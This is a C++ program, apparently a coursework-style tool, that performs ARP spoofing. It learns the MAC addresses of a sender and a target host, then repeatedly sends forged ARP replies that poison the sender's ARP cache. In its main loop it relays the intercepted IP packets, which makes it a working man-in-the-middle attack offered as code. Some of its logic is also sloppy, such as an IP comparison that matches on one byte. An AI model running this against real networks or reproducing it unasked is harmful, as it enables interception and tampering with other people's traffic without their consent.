#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <stdio.h>
#include <string.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <iostream>
using namespace std;

typedef struct
{
    struct ether_header eth_header;
    struct ether_arp arp_header;
} ARP_packet;

void usage() {
  printf("syntax: pcap_test <interface> <sender ip> <target ip>\n");
}
void str2ip(char* str, uint8_t* IP_b);
void get_attacker_mac(char* dev, uint8_t* MAC_addr);
void send_arp(pcap_t *fp, uint8_t* src_MAC, uint8_t* dst_MAC, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* target_MAC, uint8_t* target_IP, bool request_or_reply=false);
void get_mac(pcap_t *fp, uint8_t* arp_tpa, uint8_t* sender_MAC);
static int checkRelay(iphdr *ip, uint8_t* sender_IP, uint8_t* target_IP);

int main(int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return -1;
    }

    char* dev = argv[1];

    uint8_t attacker_MAC[6];
    uint8_t sender_MAC[6];
    uint8_t target_MAC[6];
    uint8_t broadcast_MAC[6]={0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint8_t unknown_MAC[6]={0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
    uint8_t unknown_IP[4]={0,0,0,0};

    uint8_t sender_IP[4];
    str2ip(argv[2], sender_IP);

    uint8_t target_IP[4];
    str2ip(argv[3], target_IP);

    get_attacker_mac(dev, attacker_MAC);


    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
    }

    //(pcap_t *fp, src_MAC, dst_MAC, sender_MAC, sender_IP, target_MAC, target_IP)
    send_arp(handle, attacker_MAC, broadcast_MAC, attacker_MAC, unknown_MAC, unknown_IP, sender_IP);
    get_mac(handle, sender_IP, sender_MAC);
    send_arp(handle, attacker_MAC, broadcast_MAC, attacker_MAC, unknown_MAC, unknown_IP, target_IP);
    get_mac(handle, target_IP, target_MAC);
    printf("sender MAC: ");
    for (int k=0; k<6; k++) {
        printf("%02x ", sender_MAC[k]);
    }
    printf("\ntarget MAC: ");
    for (int k=0; k<6; k++) {
        printf("%02x ", target_MAC[k]);
    }
    printf("\n");

    send_arp(handle, attacker_MAC, sender_MAC, attacker_MAC, target_IP, sender_MAC, sender_IP, true);

    struct pcap_pkthdr *header;
    const u_char *recv_packet;

    while (true) {
        int res = pcap_next_ex(handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) return -1;

        ether_header *eth = (ether_header *)recv_packet;

        if (eth->ether_type == htons(ETH_P_IP)){
            if (!memcmp(eth->ether_dhost, attacker_MAC, ETHER_ADDR_LEN)) {
                iphdr *ip = (iphdr *)(recv_packet + sizeof(ether_header));
                printf("Attacker got packets\n");

                int i = checkRelay(ip, sender_IP, target_IP);
                if (i != -1) {
                    for (int i=0;i<6;i++)
                    {
                         eth->ether_dhost[i]=target_MAC[i];
                         eth->ether_shost[i]=attacker_MAC[i];
                    }
                    printf("set new packet and send\n");
                    if (pcap_sendpacket(handle, (u_char *)recv_packet, header->len) == -1) {
                        printf("[ERROR] %s", pcap_geterr(handle));
                        exit(1);
                    }
                }
            }
        }

        send_arp(handle, attacker_MAC, sender_MAC, attacker_MAC, target_IP, sender_MAC, sender_IP, true);
    }
    return 0;
}


void str2ip(char* str, uint8_t* IP_b)
{
    uint32_t IP_t = inet_addr(str);
    uint8_t* IP_addr = (uint8_t*)&IP_t;

    for(int i=0; i<4; i++)
        IP_b[i] = IP_addr[i];
}


void get_attacker_mac(char* dev, uint8_t* MAC_addr){
    struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    int success=0;
    strcpy(s.ifr_name, dev);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s))
        success=1;

    if(success) memcpy(MAC_addr, s.ifr_hwaddr.sa_data, 6);
}


void send_arp(pcap_t *fp, uint8_t* src_MAC, uint8_t* dst_MAC, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* target_MAC, uint8_t* target_IP, bool request_or_reply)
{
    ARP_packet arp;

    //Set ETH header
    for (int i=0;i<6;i++)
    {
         arp.eth_header.ether_dhost[i]=dst_MAC[i];
         arp.eth_header.ether_shost[i]=src_MAC[i];
    }
    arp.eth_header.ether_type = htons(0x0806); //means ARP

    //Set ARP header
    arp.arp_header.ea_hdr.ar_hrd= htons(ARPHRD_ETHER);
    arp.arp_header.ea_hdr.ar_pro = htons(ETH_P_IP);
    arp.arp_header.ea_hdr.ar_hln = 0x06;
    arp.arp_header.ea_hdr.ar_pln = 0x04;
    if(request_or_reply == true)
        arp.arp_header.ea_hdr.ar_op = htons(ARPOP_REPLY);
    else if(request_or_reply == false)
        arp.arp_header.ea_hdr.ar_op = htons(ARPOP_REQUEST);

    memcpy(&arp.arp_header.arp_sha, sender_MAC, 6); 
    memcpy(&arp.arp_header.arp_tha, target_MAC, 6); 
    memcpy(&arp.arp_header.arp_spa, sender_IP, 4); 
    memcpy(&arp.arp_header.arp_tpa, target_IP, 4); 

    u_char arp_send_packet[42];
    memcpy(arp_send_packet, &arp, sizeof(arp));

    pcap_sendpacket(fp, arp_send_packet, 42);
}


void get_mac(pcap_t *fp, uint8_t* arp_tpa, uint8_t* get_MAC){
    ARP_packet* arp_reply_packet;

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(fp, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        arp_reply_packet = (ARP_packet*)(u_char*)packet;
        //ethernet type == 0x0806 (ARP)
        if(arp_reply_packet->eth_header.ether_type == htons(0x0806) && arp_reply_packet->arp_header.ea_hdr.ar_op==htons(ARPOP_REPLY)){
            for (int i=0; i<4; i++)
                //arp target protocol address(IP) == arp source protocol address(IP)
                if(arp_tpa[i] == arp_reply_packet->arp_header.arp_spa[i])
                {
                    memcpy(get_MAC,(arp_reply_packet->arp_header.arp_sha), 6);
                    return;
                }
        }
    }
}

static int checkRelay(iphdr *ip, uint8_t* sender_IP, uint8_t* target_IP) {
    uint32_t sender_IP_l = sender_IP[0] | (sender_IP[1] << 8) | (sender_IP[2] << 16) | (sender_IP[3] << 24);
    uint32_t target_IP_l = target_IP[0] | (target_IP[1] << 8) | (target_IP[2] << 16) | (target_IP[3] << 24);

    if (ip->saddr==sender_IP_l && ip->daddr!=target_IP_l)
        return 1;

    return -1;  // no packet to be relaied!
}

